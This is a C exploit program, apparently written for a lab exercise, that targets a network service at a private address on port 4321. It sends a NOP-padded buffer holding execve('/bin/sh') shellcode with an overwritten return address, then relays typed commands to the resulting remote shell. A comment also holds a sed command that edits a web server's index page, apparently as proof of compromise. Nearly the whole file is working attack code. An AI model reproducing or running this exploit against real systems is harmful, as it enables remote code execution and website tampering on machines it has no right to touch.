#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>

/*
I got the shellcode from :
https://www.exploit-db.com/exploits/43550

sed -i 's#</body>#<p>Bahaeddine Abdessalem</p>\n</body>#' /var/www/html/index.html
*/

#define TARGET_IP "192.168.56.103"
#define TARGET_PORT 4321
#define OFFSET 140
#define BUFFER_SIZE 256
int main() {
    const uint64_t RETURN_ADDRESS = 0x7fffffffe5f0;  
    uint8_t buffer[BUFFER_SIZE];
    memset(buffer, 0x90, BUFFER_SIZE); 

    // execve("/bin/sh") shellcode 
    const uint8_t shellcode[] = { 0x31, 0xc0, 0x48, 0xbb, 0xd1, 0x9d, 0x96, 0x91, 0xd0, 0x8c, 0x97, 0xff, 0x48, 0xf7, 0xdb, 0x53, 0x54, 0x5f, 0x99, 0x52, 0x57, 0x54, 0x5e, 0xb0, 0x3b, 0x0f, 0x05 };

    memcpy(buffer, shellcode, sizeof(shellcode));
    memcpy(buffer + OFFSET, &RETURN_ADDRESS, sizeof(uint64_t));

    int sock_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (sock_fd < 0) {
        perror("socket");
        return 1;
    }

    struct sockaddr_in server_adr;
    memset(&server_adr, 0, sizeof(server_adr));
    server_adr.sin_family = AF_INET;
    server_adr.sin_port = htons(TARGET_PORT);
    inet_pton(AF_INET, TARGET_IP, &server_adr.sin_addr);

    if (connect(sock_fd, (struct sockaddr*)&server_adr, sizeof(server_adr)) < 0) {
        perror("connect");
        close(sock_fd);
        return 1;
    }

    char recv_buf[512] = {0};
    recv(sock_fd, recv_buf, sizeof(recv_buf)-1, 0);
    printf("Received: %s\n", recv_buf);

    send(sock_fd, buffer, BUFFER_SIZE, 0);
    printf("Buffer sent successfully.\n");

    char command[256];
    while (1) {
        memset(command, 0, sizeof(command));
        printf("Command to execute :\n");
        if (!fgets(command, sizeof(command), stdin)) break;
        send(sock_fd, command, strlen(command), 0);
    }
    close(sock_fd);
    return 0;
}